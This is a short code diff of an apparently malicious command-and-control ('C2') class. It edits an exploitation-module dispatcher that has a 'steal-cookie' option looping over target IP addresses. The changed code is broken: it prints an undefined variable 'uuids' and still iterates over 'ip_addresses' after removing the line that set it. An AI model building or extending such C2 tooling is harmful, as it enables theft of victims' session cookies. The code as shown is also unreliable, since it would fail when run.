@@ -108,9 +108,9 @@ class C2:
 
     def explotation_module(self, data):
         explotation_module_type = data['explotation_module']
-        ip_range = data['ip']
+        ip_range = data['uuids']
 
-        ip_addresses = self.parce_ip(ip_range)
+        print(uuids)
 
         if explotation_module_type == "steal-cookie":
             for ip in ip_addresses:
